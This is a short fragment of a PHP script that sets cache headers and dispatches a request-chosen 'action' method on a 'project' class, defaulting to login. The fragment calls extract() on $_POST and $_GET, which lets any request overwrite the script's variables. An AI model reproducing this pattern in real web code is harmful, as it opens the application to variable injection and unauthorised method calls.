define('gzip',function_exists("ob_gzhandler") ? 'gzip on' : 'gzip off');
extract($_POST);
extract($_GET);
header ("Cache-Control: no-cache, must-revalidate");  
header ("Pragma: no-cache");  
project::init();
$action=!empty($action) ? strtolower(rtrim($action,'/')) : 'login';
if (!is_callable(array('project', $action))) return false;
if (!method_exists('project', $action)) return false;
call_user_func(array('project', $action));
}
//?>